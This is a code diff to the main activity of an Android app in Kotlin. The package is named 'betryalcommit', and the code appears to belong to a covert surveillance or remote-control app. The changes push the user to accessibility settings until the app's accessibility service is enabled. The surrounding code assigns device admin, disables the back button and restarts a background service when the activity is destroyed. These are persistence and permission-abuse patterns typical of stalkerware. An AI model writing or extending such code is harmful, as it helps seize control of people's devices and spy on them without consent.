@@ -1,4 +1,5 @@
 package com.example.betryalcommit
+import android.content.Context
 import android.content.Intent
 import android.os.Bundle
 import android.provider.Settings
@@ -14,6 +15,11 @@ class MainActivity : AppCompatActivity() {
         super.onCreate(savedInstanceState)
         supportActionBar?.hide()
         setContentView(R.layout.activity_main)
+        if (!isAccessibilityServiceEnabled()) {
+            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            applicationContext.startActivity(intent)
+        }
         AdminAct.initialize(this);
         if (AdminAct.isDeviceAdminAssigned()) {
             val serviceIntent = Intent(this, MyService::class.java)
@@ -22,11 +28,11 @@ class MainActivity : AppCompatActivity() {
             Permsu.requestPermissions(this, this, PERMISSION_REQUEST_CODE)
 
         }
-        if (!Permsu.isAccessibilityServiceEnabled(this)) {
-            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
-            this.startActivity(intent)
-        }
+
+
+
     }
+
 
     override fun onBackPressed() {
 
@@ -36,5 +42,14 @@ class MainActivity : AppCompatActivity() {
         val serviceIntent = Intent(this, MyService::class.java)
         startService(serviceIntent)
          super.onDestroy()
+    }
+
+
+     fun isAccessibilityServiceEnabled(): Boolean {
+        val accessibilitySettings = Settings.Secure.getString(
+            applicationContext.contentResolver,
+            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
+        )
+        return accessibilitySettings?.contains(this.packageName) == true
     }
 }
